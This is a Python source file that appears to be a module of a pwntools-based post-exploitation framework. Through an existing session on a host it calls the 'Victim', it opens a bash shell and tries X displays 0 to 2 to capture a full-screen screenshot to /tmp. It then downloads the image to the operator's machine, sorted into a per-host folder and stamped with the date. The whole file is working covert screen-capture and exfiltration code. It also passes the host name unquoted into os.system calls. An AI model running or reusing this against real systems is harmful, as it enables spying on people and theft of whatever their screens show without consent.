#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

waitforcapture = 1

def execute(session, configs, params):
    download_dir = configs["DownloadDirectory"] + session.host + "/"

    try:
        if "no" in str(session.which("import"), "UTF-8"):
            print(cs.error, "Victim does not have dependency: import")
            return 2

        shell = session.shell("/bin/bash")
        for i in range(0, 3):
            shell.sendline("(DISPLAY=:" + str(i) + " && export DISPLAY && import -window root /tmp/ss.png 2> /dev/null) || echo payloadfailed")
            if "payloadfailed" not in str(shell.recvrepeat(0.2), "UTF-8"):
                sleep(waitforcapture)
                shell.close()

                os.system("mkdir -p " + download_dir)
                session.download_file("/tmp/ss.png", download_dir + "ss.png")
                os.system("mv " + download_dir + "ss.png " + download_dir + "ss_$(date +'%Y-%m-%d-%T').png")
                return 0
            else:
                pass
    except:
        return 2
    
    return 2
